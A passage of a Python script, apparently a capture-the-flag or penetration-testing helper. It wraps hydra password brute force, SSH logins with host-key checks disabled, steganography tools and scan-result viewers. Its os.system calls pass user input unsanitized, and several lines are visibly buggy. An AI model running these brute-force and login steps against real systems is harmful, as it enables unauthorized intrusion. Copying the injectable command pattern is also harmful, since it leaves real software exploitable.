        os.system(f"""terminator -T 'Brute Force Password List Attack' -e 'hydra -l {user_name} -P {pass_list} {protocol}://{target_ip}:{port};echo "\n\033[1;33mPress ENTER to continue";read'""")
        found = input("Did you found something? Y/n > ")
        if found == 'y' or found == 'Y':
            pass_found = input("Enter the password you found > ")
            os.system(f"""echo "'username': {user_name}, 'password': {pass_found}'" > {file_save}/Creds""")
        else:
            print(green + "Try something else then mate" + normal)
    else:
        pass

    main(attacker_ip, target_ip, file_save)


def ssh_connect(target_ip):
    print(red + pyfiglet.figlet_format("SSH connection") + normal)
    what_to_do = input(yellow + "How do you want to connect?\n" + normal + "0: Back to main menu\n1: id_rsa key\n2: Auto\Manual connection\n3: ssh on a different port\n> ")
    if what_to_do == '0':
        main(attacker_ip, target_ip, file_save)
    elif what_to_do == '1':
        id_rsa_path = input("Enter your id_rsa key full(!!!) path here > ")
        user_name = input("Enter user name > ")
        os.system(f"chmod 600 {id_rsa_path}")
        os.system(f"terminator -T 'SSH Connect id_rsa' -e 'ssh -i {id_rsa_path} {user_name}@{target_ip} -o 'StrictHostKeyChecking=no''")

    elif what_to_do == '2':
        password = input("Did you copy the password to your clipboard? Y/n > ")
        if password == 'y' or password == 'Y':
            user_name = input("Enter user name > ")
            input(red + "!!!For privilege escalation 'sudo -l' the password is on your clipboard!!!" + normal + "\nPress ENTER to continue...")
            os.system(f"""terminator -T 'SSH Connect Auto Connection' -e 'sshpass -p "{pyperclip.paste()}" ssh {user_name}@{target_ip} -o "StrictHostKeyChecking=no"'""")
        else:
            user_name = input("Enter user name > ")
            passwd = input("Enter password > ")
            pyperclip.copy(passwd)
            input(red + "!!!For privilege escalation 'sudo -l' the password is on your clipboard!!!" + normal + "\nPress ENTER to continue")
            os.system(f"""terminator -T 'SSH Connect Auto Connect' -e 'sshpass -p "{passwd}" ssh {user_name}@{target_ip} -o "StrictHostKeyChecking=no"'""")

    elif what_to_do == '3':
        port = input("Enter new port number > ")
        what_to_do = input("How do you want to connect?\n0: Back to main menu\n1: id_rsa key\n2: Auto connection\n3: Manual connection\n> ")

        if what_to_do == "0":
            main(attacker_ip, target_ip, file_save)

        elif what_to_do == '1':
            user_name = input("Enter the user name > ")
            id_rsa_path = input("Enter your id_rsa key path here > ")
            os.system(f"chmod 600 {id_rsa_path}")
            os.system(f"terminator -T 'SSH Connect id_rsa' -e 'ssh -i {id_rsa_path} {user_name}@{target_ip} -o 'StrictHostKeyChecking=no''")

        elif what_to_do == '2':
            pass_copy = input("Did you copied the password to clipboard? Y/n > ")
            if pass_copy == 'y' or pass_copy == 'Y':
                user_name = input("Enter user name > ")
                print(red + "!!!For privilege escalation 'sudo -l' the password is in your clipboard!!!" + normal)
                os.system(f"terminator -T 'SSH Connect Auto Connect' -e 'sshpass '{pyperclip.paste()}' ssh {user_name}@{target_ip} -o 'StrictHostKeyChecking=no''")
            else:
                user_name = input("Enter user name > ")
                password = input("Enter the password > ")
                pyperclip.copy(password)
                print(red + "!!!For privilege escalation 'sudo -l' the password in in your clipboard!!!" + normal)
                os.system(f"terminator -T 'SSH Connect Auto Connect' -e 'sshpass -p '{password}' ssh {user_name}@{target_ip} -p {port} -o 'StrictHostKeyChecking=no''")

        elif what_to_do == '3':
            user_name = input("Enter user name > ")
            os.system(f"terminator -T 'SSH Connect' -e 'ssh {user_name}@{target_ip} -p {port} -o 'StrictHostKeyChecking=no''")

    main(attacker_ip, target_ip, file_save)


def forensics(file_save):
    print(f"\n{yellow}Files in folder: {normal}")
    os.system(f"ls -l {file_save}/ | file *")
    print("\n")
    menu = input(yellow + "0: Back to main menu\n" + normal + "1: JPG photo investigate\n2: PNG photo investigate\n3: Change photo's hex code\n4: Check colors of the photo\n5: BinWalk\n> ")
    if menu == '0':
        main(attacker_ip, target_ip, file_save)

    elif menu == '1':
        os.system('ls -la')
        menu_1 = input("0: Back to main menu\n1: Info\n2: Extract\n> ")
        if menu_1 == '1':
            file_name = input("Enter file name > ")
            os.system(f"""terminator -T 'Steghide Info' -e 'steghide info {file_name};echo "\n\033[1;33mPress ENTER to continue";read'""")
            forensics(file_save)

        elif menu_1 == '2':
            os.system('ls -la')
            file_name = input("Enter file name > ")
            os.system(f"""terminator -T 'Steghide Extract' -e 'setghide extract -sf {file_save}/{file_name};echo "\n\033[1;33mPress ENTER to continue";read'""")
            forensics(file_save)
        else:
            print(error + "You didn't choose..." + normal)
            forensics(file_save)

    elif menu == '2':
        os.system('ls -la')
        file_name = input("Enter file name > ")
        os.system(f"""terminator -T 'Zsteg' -e 'zsteg {file_save}/{file_name};echo "\n\033[1;33mPress ENTER to continue";read'""")
        main(attacker_ip, target_ip, file_save)

    elif menu == '3':
        os.system('ls -la')
        file_name = input("Enter file name > ")
        os.system(f"""terminator -T 'Photo HexEditor' -e 'hexedit {file_save}/{file_name};echo "\n\033[1;33mPress ENTER to continue";read'""")
        main(attacker_ip, target_ip, file_save)

    elif menu == '4':
        os.system('ls -la')
        file_name = input("Enter file name > ")
        os.system(f"""terminator -T 'StegSolver' -e 'java -jar /opt/.stegsolve.jar {file_save}/{file_name}'""")
        main(attacker_ip, target_ip, file_save)

    elif menu == '5':
        os.system('ls -la')
        file_name = input("Enter file name > ")
        os.system(f"""terminator -T 'BinWalk' -e 'binwalk -e {file_save}/{file_name};echo "\n\033[1;33mPress ENTER to continue";read'""")
        main(attacker_ip, target_ip, file_save)

    else:
        print(error + "Please choose something..." + normal)
        forensics(file_save)


# Start section of found stuff


def results(file_save):
    menu = input("What do you want to do?\n0: Back to main menu\n1: Nmap results\n2: Web scan results\n3: SMB scan result\n4: WPscan results\n> ")
    if menu == '0':
        main(attacker_ip, target_ip, file_save)
    elif menu == '1':
        nmap_results(file_save)
    elif menu == "2":
        gobuster_results(file_save)
    elif menu == '3':
        smb_results(file_save)
    elif menu == '4':
        WPscan_results(file_save)
    else:
        print(error + "You need to enter something..." + normal)
        results(file_save)


def change_user_file(file_save):
    menu = input(yellow + "What do you want to do?\n" + normal + "0: Back to main menu\n1: Create a new file with user name and password\n2: Edit user name or password you found in hydra\n> " + normal)
    if menu == '0':
        main(attacker_ip, target_ip, file_save)
    elif menu == '1':
        username = input("Enter the username > ")
        password = input("Enter the password > ")
        cred = {"username": username, "passowrd": password}
        with open(f"{file_save}/Creds", 'w') as file:
            json.dump(cred, file)
            main(attacker_ip, target_ip, file_save)

    elif menu == '2':
        pass

    else:
        print("Please enter a valid value...")
        change_user_file(file_save)


def smb_results(file_save):
    os.system(f'cat {file_save}/smb_enum.log | less')


def nmap_results(file_save):
    menu = input(yellow + "What do you want to do?\n" + normal + "0: Back to main menu\n1: Rscan_Default\n2: Rscan\n> ")
    if menu == '0':
        main(attacker_ip, target_ip, file_save)
    elif menu == '1':
        if "Rscan_Default" not in os.listdir(file_save):
            print(error + "You didn't do that scan!!" + normal)
            nmap_results(file_save)
        else:
            os.system(f"cat {file_save}/Rscan_Default | less")
    elif menu == '2':
        if "Rscan" not in os.listdir(file_save):
            print(error + "You didn't do this scan!!" + normal)
            nmap_results(file_save)
        else:
            os.system(f"cat {file_save}/Rscan | less")

    main(attacker_ip, target_ip, file_save)


def gobuster_results(file_save):
    menu = input(yellow + "What do you want to do?\n" + normal + "0: Back to main menu\n1: Gscan_Default\n2: Gscan\n3: Gscan_after_200_follow\n4: Gscan_Cosume_URL> ")
    if menu == '0':
        main(attacker_ip, target_ip, file_save)
    elif menu == '1':
        if "Gscan_Default" not in os.listdir(file_save):
            print(error + "You didn't do this scan!!" + normal)
            gobuster_results(file_save)
        else:
            os.system(f"cat {file_save}/Gscan_Default | less")
    elif menu == '2':
        if "Gscan" not in os.listdir(file_save):
            print(error + "You didn't do this of scan" + normal)
            gobuster_results(file_save)
        else:
            os.system(f"cat {file_save}/Gscan | less")
    elif menu == '3':
        if "Gscan_after_200_follow" not in os.listdir(file_save):
            print(error + "You didn't do this scan!!" + normal)
            gobuster_results(file_save)
        else:
            os.system(f"cat {file_save}/Gscan_after_200_follow | less")

    elif menu == '4':
        if "Gscan_costume_URL" not in os.listdir(file_save):
            print(error + "You didn't do this scan!!" + normal)
            gobuster_results(file_save)
        else:
            os.system(f"cat {file_save}/Gscan_costume_URL | less")
    main(attacker_ip, target_ip, file_save)


def WPscan_results(file_save):
    menu = input("What do you want to do?\n0: Back to main menu\n1: wp.log\n2: wp_password.log\n> ")
    if menu == '0':
        main(attacker_ip, target_ip, file_save)
    elif menu == '1':
        os.system(f"cat {file_save}/wp.log | less")
    elif menu == '2':
        os.system(f"cat {file_save}/wp_password.log | less")
    else:
        print(error + "Please choose something" + normal)
        WPscan_results(file_save)

    main(attacker_ip, target_ip, file_save)


def found_creds(file_save):
    if "Creds" not in os.listdir(file_save):
        print("There is no file!!!")
    else:
        with open(f"{file_save}/Creds", "r") as creds:
            print(creds.readline())
            copy = input("Do you want to copy the password to your clipboard? Y/n > ")
            if copy == 'Y' or copy == 'y':
                data = json.load(creds)
                password = data['password']
                pyperclip.copy(password)
                print(green + "[+] Copied to your clipboard")

    main(attacker_ip, target_ip, file_save)


if __name__ == '__main__':
    colorama.init(autoreset=True)
    # Colors
    error = Back.RED
    red = Fore.RED
    green = Fore.GREEN
    blue = Fore.BLUE
    yellow = Fore.YELLOW
    normal = Fore.RESET
    # End of colors
    try:
        os.system('ip -c a ')
        attacker_ip = input("\n" + green + "Enter your ip address > ")

        print("\n")

        target_ip = input(red + "Enter the target ip > ")

        print("\n")

        where_am_I = subprocess.run("pwd", shell=True, capture_output=True)

        print(green + "You are here" + red + f" {where_am_I.stdout.decode()}" + normal)

        file_save = input(yellow + "Where do you want to save your scan result?                 ---If you press ENTER it will save in your current directory\n> ")
        if file_save == '':
            file_save = '.'

        print("\n")

        if file_save == '.':
            print(green + "Your files will be save in:  " + red + f"{where_am_I.stdout.decode().strip()}/{file_save}" + normal)
        else:
            print(green + "Your files will be save in:  " + red + f"{file_save}" + normal)

        print("\n")

        test = input(blue + "Do you want to check if the target is online? Y/n \n> ")

        print("\n")

        try:
            if test == 'y' or test == 'Y' or test == '':

                print(yellow + "Testing to see if the victim is alive:\nIt will send 30 ping packets. Wait until done... \n" + normal + green + "You can press Ctrl+c to skip..." + normal)

                print("\n")

                a = subprocess.run(f"ping -c 20 {target_ip}", shell=True, capture_output=True)

                if '100% packet loss' in str(a):
                    input(red + "Host is not up or it is a windows machine\nPress ENTER to continue")

                elif 'icmp_seq' in str(a):
                    input(green + "[+] Host is up!\nPress ENTER to continue")

            else:
                pass
        except KeyboardInterrupt:
            print(green + "[+] Skipping testing...")

        main(attacker_ip, target_ip, file_save)

    except KeyboardInterrupt:
        print(yellow + pyfiglet.figlet_format("\nGood  bye"))
        sys.exit()

    '''
    Add in wpscan an option for a specific user name and add joomscan? if yes add to setup joomscan and change the title to CMS Enum.
    Add an option for tls skipping (-k) in gobuster
    Add a section for sqlmap? maby later...
    '''
